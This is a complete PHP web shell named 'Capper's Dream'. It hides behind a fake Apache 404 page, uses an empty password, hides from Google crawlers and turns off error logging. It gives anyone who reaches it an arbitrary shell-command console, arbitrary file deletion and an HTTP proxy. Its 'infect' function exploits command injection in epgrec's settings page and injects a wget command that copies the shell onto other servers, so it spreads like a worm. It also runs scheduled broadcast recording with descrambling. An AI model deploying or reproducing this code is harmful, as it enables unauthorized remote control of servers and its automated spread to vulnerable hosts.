<?php
date_default_timezone_set("Japan");

$auth_pass = "";
@DEFINE('RECORDS_FILE', ".j.db");
@define('SELF_PATH', __FILE__); 
if (@file_get_contents(RECORDS_FILE) === false) {
    file_put_contents(RECORDS_FILE, "");
}

if(isset($_GET['raw'])) {
    readfile(__FILE__);
    exit;
}

if(isset($_POST['install'])) {
    ex('mkdir ...');
    ex('mv ./b.php ./.../b.php');
    exit;
}

if (isset($argv[1]) || isset($_GET['cron'])) { //cron call
    cron();
    echo "cron";
    exit;
}

if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
    header('HTTP/1.0 404 Not Found'); 
    exit; 
} 


@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0); 
@set_time_limit(0); 
@set_magic_quotes_runtime(0);
@define('VERSION', '0.2'); 

if (get_magic_quotes_gpc()) { 
    function stripslashes_array($array) { 
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
    } 
    $_POST = stripslashes_array($_POST); 
}

$thisScriptUrl = (@$_SERVER["HTTPS"] == "on") ? "https://" : "http://";
if ($_SERVER["SERVER_PORT"] != "80") {
    $thisScriptUrl .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["SCRIPT_NAME"];
} else {
    $thisScriptUrl .= $_SERVER["SERVER_NAME"].$_SERVER["SCRIPT_NAME"];
}

$home_cwd = @getcwd(); 
if (isset($_POST['c'])) 
    @chdir($_POST['c']); 
$cwd = @getcwd(); 

$charset = "UTF-8";

function printLogin() {
?>
<h1>Not Found</h1> 
<p>The requested URL was not found on this server.</p> 
<hr> 
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <center> 
    <form method=post> 
    <input type=password name=pass> 
    </form></center> 
<?php
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (empty($auth_pass) || (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    } else {
        printLogin();
        exit;
    }
}

function printHeader() {
    $freeSpace = @diskfreespace($GLOBALS['cwd']); 
    $totalSpace = @disk_total_space($GLOBALS['cwd']);
    //if(empty($_POST['charset']))
        $_POST['charset'] = "UTF-8";
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=<?php echo $_POST['charset'];?>"><title><?php echo $_SERVER['HTTP_HOST'];?> - Capper's Dream v<?php echo VERSION;?></title>
<script>
window.console = console || {log:function(){return false;}};
var commands = [];
function getReqOb() {
    var httpRequest;
    if (window.XMLHttpRequest) { // Mozilla, Safari, ...  
      httpRequest = new XMLHttpRequest();  
    } else if (window.ActiveXObject) { // IE  
      try {  
        httpRequest = new ActiveXObject("Msxml2.XMLHTTP");  
      }   
      catch (e) {  
        try {  
          httpRequest = new ActiveXObject("Microsoft.XMLHTTP");  
        }   
        catch (e) {}  
      }  
    }
    return httpRequest;
}

function infect(ip) {
    ip = ip || document.getElementById("infectIP").value;
    if (!ip) return;
    if (ip.indexOf("http") == -1)
        ip = "http://" + ip;

    if (ip.charAt(ip.length-1) != "/")
        ip += "/";

    if (ip.indexOf("epgrec") == -1)
        ip += "epgrec/";

    console.log("Starting the hack of "+ip);

    var httpRequest = getReqOb();
    if (!httpRequest) return alert("The only reason I'm using an alert is because your browser doesn't support ajax. You suck.");

    /*httpRequest.open('POST', ip + "postsettings.php", false);
    var formData = new FormData();
    formData.append("epgdump", "wget <?php echo $GLOBALS['thisScriptUrl'];?> -O ./thumbs/b.php; /usr/local/bin/epgdump");
    httpRequest.send(formData);
    console.log(httpRequest);*/
    httpRequest.open('POST', document.URL, false);
    var formData = new FormData();
    formData.append('ajax', 'true');
    formData.append('name', 'epgdump');
    formData.append('data', 'wget <?php echo $GLOBALS['thisScriptUrl']."?raw";?> -O ./templates_c/d.php; /usr/local/bin/epgdump');
    formData.append('post', ip + "postsettings.php");
    httpRequest.send(formData);
    console.log(httpRequest);


    /*httpRequest.open('GET', ip + "getepg.php");
    httpRequest.timeout = 2000;
    httpRequest.onreadystatechange = function() {
        console.log(httpRequest);

        httpRequest.open('POST', ip + "postsettings.php", false);
        formData = new FormData();
        formData.append("epgdump", "/usr/local/bin/epgdump");
        httpRequest.send(formData);
        console.log(httpRequest);

    };
    httpRequest.send(null);*/
    httpRequest = getReqOb();
    httpRequest.open('POST', document.URL, false);
    formData = new FormData();
    formData.append('ajax', 'true');
    formData.append('name', '');
    formData.append('data', '');
    formData.append('post', ip + "getepg.php");
    httpRequest.send(formData);
    console.log(httpRequest);

    httpRequest = getReqOb();
    httpRequest.open('POST', document.URL, false);
    formData = new FormData();
    formData.append('ajax', 'true');
    formData.append('name', 'epgdump');
    formData.append('data', '/usr/local/bin/epgdump');
    formData.append('post', ip + "postsettings.php");
    httpRequest.send(formData);
    console.log(httpRequest);

    httpRequest = getReqOb();
    httpRequest.open('POST', document.URL, false);
    formData = new FormData();
    formData.append('ajax', 'true');
    formData.append('name', 'install');
    formData.append('data', 'true');
    formData.append('post', ip + "/cache/.fag.php");
    httpRequest.send(formData);
    console.log(httpRequest);


    return false;
}

function sendCommand() {
    var inp = document.getElementById("consoleInput");
    var out = document.getElementById("consoleOutput");

    var formData = new FormData();
    var httpRequest = getReqOb();
    if (!httpRequest) return alert("The only reason I'm using an alert is because your browser doesn't support ajax. You suck.");
    httpRequest.open('POST', document.URL);
    formData.append("ajax", "true");
    formData.append("command", inp.value);
    var tdiv = document.createElement("div");
    tdiv.innerHTML = "USER&gt; " + inp.value.replace("<", "&lt;").replace(">", "&gt;");
    out.appendChild(tdiv);
    inp.value = "";
    httpRequest.onreadystatechange = function() {
        if( (httpRequest.readyState == 4) ) 
            if(httpRequest.status == 200) { 
                //alert(req.responseText); 
                //console.log(httpRequest.responseText.replace("\n", "<br>").replace("<", "&lt;").replace(">", "&gt;"));
                out.innerHTML += "  " + httpRequest.responseText.replace(/</gi, "&lt;").replace(/>/gi, "&gt;").replace(/\n/gi, "<br>  ");
            }  
            else alert("Request error!"); 
    };
    httpRequest.send(formData);

}

function setRecord() {
    var channelE = document.getElementById("channel"),
		sidE = document.getElementById("sid"),
        durationE = document.getElementById("duration"),
        hourE = document.getElementById("hour"),
        dayE = document.getElementById("day"),
        minuteE = document.getElementById("minute");

    var channel = channelE.value,
	    sid = sidE.value,
        duration = parseInt(durationE.value),
        hour = parseInt(hourE.value),
        day = parseInt(dayE.value),
        minute = parseInt(minuteE.value);

    if (/*isNaN(channel) || */isNaN(duration) || isNaN(hour) || isNaN(minute) || isNaN(day)) return alert("Need better values");

    var formData = new FormData();
    var httpRequest = getReqOb();
    if (!httpRequest) return alert("The only reason I'm using an alert is because your browser doesn't support ajax. You suck.") && false;
    httpRequest.open('POST', document.URL);
    formData.append("ajax", "true");
    formData.append("channel", channel);
	formData.append("sid", sid);
    formData.append("duration", duration);
    formData.append("minute", minute);
    formData.append("day", day);
    formData.append("hour", hour);

    httpRequest.send(formData);
    console.log(httpRequest);

    return false;
}
</script> 
<style>
body {
    margin: 0;
    font: 14px Lucida,Verdana;
}
    #infoHeader {
    margin: 12px;
    padding: 12px 0;
    border: 1px solid black;
}
#infoHeader span {
    margin: 12px;
}
#actions, #console, #schedule {
    margin: 12px;
    padding: 12px;
    border: 1px solid black;
}
#consoleOutput {
    height: 200px;
    border: 1px solid grey;
    display: block;
    overflow: auto;
    white-space: pre;
    position: relative;
    font-family: Courier New;
}
h3 {
    margin: 7px 0;
    line-height: 1.4;
}
</style>
</head><body>
<noscript><h1 stlye="color:red;">How the fuck do you expect this to work without javascript?</h1></noscript>
<div id="infoHeader"><span>Cwd: <?php echo $GLOBALS['cwd'];?></span><span>Free Space: <?php echo viewSize($freeSpace);?></span><span>Total Space: <?php echo viewSize($totalSpace);?></span></div>
<?php
}

function listActions() {
?>
<div id="actions">
    <h3>Actions</h3>
    <form onsubmit="return infect() && false;">Infect another server (ip/domain): <input id=infectIP name=infectIP placeholder=ServerIp><input type=submit></form>
    <form onsubmit="return setRecord() && false;">Record channel: <input name=channel id=channel size=4 placeholder=channel> SID: <input name=sid id=sid size=4 placeholder=SID value=hd> For <input name=duration id=duration size=3 value=30> minutes<input type=submit>
        Starting at (military time): <input name=hour id=hour size=2 value=<?php echo date('H');?>>:<input name=minute id=minute size=2 value=<?php echo date('i');?>> Day: <input name=day size=2 id=day value=<?php echo date('d');?>></form>
    <?php if (cron_infected()) {?>
    <span style="color: green">Cron is infected</span> 
    <?php } else { ?>
    <span style="color: red">Cron is not infected</span> 
    <?php } ?>
</div>
<?php
}

function listSchedule() {
?>
<div id="schedule">
    <h3>Schedule <span style="font-weight: normal;font-size:14px">(Today is <?php echo date("F j, Y, H:i");?>) | <a href='?d=.j.db'>Delete records</a></span></h3>
    <?php
    cron();
    $data = explode("\n",trim(file_get_contents(RECORDS_FILE)));
    
    foreach ($data as $key => $value) {
        $vs = explode(' ', $value);
        if ($vs[0] == "0") {
            echo "Waiting: ";
        } elseif ($vs[0] == "1") {
            echo "Recording: ";
        } else {
            echo "Done: ";
        }
        
        echo date("F j, Y, H:i ", intval($vs[1]));
        echo "Channel: ".$vs[3]." (".$vs[4].") duration: ".$vs[2];
        if ($vs[0] == "2") {
			if(file_exists($vs[3]."-".$vs[4]."-".$vs[2]."-".$vs[1].".ts"))
				echo " | Link: <a href='./".$vs[3]."-".$vs[4]."-".$vs[2]."-".$vs[1].".ts'>".$vs[3]."-".$vs[4]."-".$vs[2]."-".$vs[1].".ts</a> | <a href='".$GLOBALS['thisScriptUrl']."?d=".$vs[3]."-".$vs[4]."-".$vs[2]."-".$vs[1].".ts'>Delete</a> | " . (round(filesize($vs[3]."-".$vs[4]."-".$vs[2]."-".$vs[1].".ts") / 1024 / 1024, 2)) . " MB";
			else
				echo " | <font color='red'>File doesn't exist.</font>";
            //echo " Link: <a href=./".$vs[3].'-'.$vs[2].'-'.$vs[1].'.ts>'.$vs[3].'-'.$vs[2].'-'.$vs[1] .'.ts</a>';
			
        }
        echo '<br>';
    }
     ?>
</div>
<?php
}

if(!empty($_GET['d'])) { unlink($_GET['d']); header("Location: ".$GLOBALS['thisScriptUrl']); }

function printConsole() {
?>
<div id="console">
    <form onsubmit="sendCommand();return false;"><h3>Console</h3><br><div id='consoleOutput'></div><input id='consoleInput' name=consoleInput width=100%></form>
</div>
<?php
}

function printConnectedIPs() {
?>
<div id="console">
<h3>Connected IPs</h3>
<?php
netstat();
?>
</div>
<?php
}

if (!isset($_POST['ajax'])) {
    printHeader();
    listActions();
    listSchedule();
    printConsole();
	printConnectedIPs();
} elseif (isset($_POST['command'])) {
    echo ex($_POST['command']);
} elseif (isset($_POST['post'])) {
    echo do_post_request($_POST['post'], http_build_query(array($_POST['name'] => $_POST['data'])));
} elseif (isset($_POST['duration'])) {
    echo record();
}

function record() {
    //file format:
/*

status (int) start_time (in int) duration (int) channel (int)

status:
    0: waiting
    1: downloading
    2: done
    3: remove (should never get here)

*/
    $channel = $_POST['channel'];
    $duration = $_POST['duration'];
    $hour = $_POST['hour'];
    $day = $_POST['day'];
    $minute = $_POST['minute'];
	$sid = $_POST['sid'];
	
    $time = strtotime($day . date('F Y') . $hour.':'.$minute);

    $str = "0 ".$time.' '.$duration.' '.$channel.' '.$sid;
    $prev = file_get_contents(RECORDS_FILE);
    echo $prev;
    file_put_contents(RECORDS_FILE, $prev."\n".$str); //yes I know append is more effiecnt, this was easier to remember and type (auto-completion ftw)
    cron();
    return 'success!';
}

function cron() {
    $data = explode("\n",trim(file_get_contents(RECORDS_FILE)));
    
    foreach ($data as $key => $value) {
        $vs = explode(' ', $value);
        if ($vs[0]=="1") {
            if (strtotime('now') - intval($vs[1]) > (intval($vs[2])+1)) {
                $vs[0]='2';
            }
        } elseif ($vs[0] =="0") {
            if (intval($vs[1]) < strtotime('+ 2 minute 10 seconds')) {
                $vs[0]='1';
                ex_out('/usr/local/bin/recpt1 --b25 --strip --sid '.$vs[4].' '.$vs[3].' '.(intval($vs[2])+1).'m '.$vs[3]."-".$vs[4]."-".$vs[2].'-'.$vs[1] .'.ts');
                //ex_out('/usr/local/bin/recpt1 ' .$vs[3] . ' ' . (intval($vs[2])+1) . 'm ' . $vs[3].'-'.$vs[2].'-'.$vs[1] .'.ts');
            }
        }
        $data[$key] = $vs[0] . ' ' . $vs[1] . ' ' . $vs[2] . ' ' . $vs[3] . ' ' . $vs[4];
    }

    file_put_contents(RECORDS_FILE, implode("\n", $data));
}

function cron_infected() {
    return false;
}

function viewSize($s) { 
    if($s >= 1073741824) 
        return sprintf('%1.2f', $s / 1073741824 ). ' GB'; 
    elseif($s >= 1048576) 
        return sprintf('%1.2f', $s / 1048576 ) . ' MB'; 
    elseif($s >= 1024) 
        return sprintf('%1.2f', $s / 1024 ) . ' KB'; 
    else 
        return $s . ' B'; 
} 
function ex($in) { 
    $out = ''; 
    $in = "(".$in;$in .= ") 2>&1";
    if(function_exists('exec')) { 
        @exec($in,$out); 
        $out = @join("\n",$out); 
    }elseif(function_exists('passthru')) { 
        ob_start(); 
        @passthru($in); 
        $out = ob_get_clean(); 
    }elseif(function_exists('system')) { 
        ob_start(); 
        @system($in); 
        $out = ob_get_clean(); 
    }elseif(function_exists('shell_exec')) { 
        $out = shell_exec($in); 
    }elseif(is_resource($f = @popen($in,"r"))) { 
        $out = ""; 
        while(!@feof($f)) 
            $out .= fread($f,1024); 
        pclose($f); 
    } 
    return $out; 
}
function ex_out($in) {
    ex($in." > /dev/null 2>&1 &");
}

function do_post_request($url, $data, $optional_headers = null)
{
  $params = array('http' => array(
              'method' => 'POST',
              'header'=> "Content-type: application/x-www-form-urlencoded\r\n"
                . "Content-Length: " . strlen($data) . "\r\n",
              'content' => $data,
              'timeout' => 3
            ));
  print_r($params);
  if ($optional_headers !== null) {
    $params['http']['header'] = $optional_headers;
  }
  $ctx = stream_context_create($params);
  $fp = @fopen($url, 'rb', false, $ctx);
  if (!$fp) {
    return "Problem with $url, $php_errormsg";
  }
  $response = @stream_get_contents($fp);
  if ($response === false) {
    return "Problem reading data from $url, $php_errormsg";
  }
  return $response;
} 

function netstat() {
	$netstat = exec("netstat -tn |grep :80", $output);
	foreach($output as $ip) {
		echo "{$ip}<br />";
	}
}
?>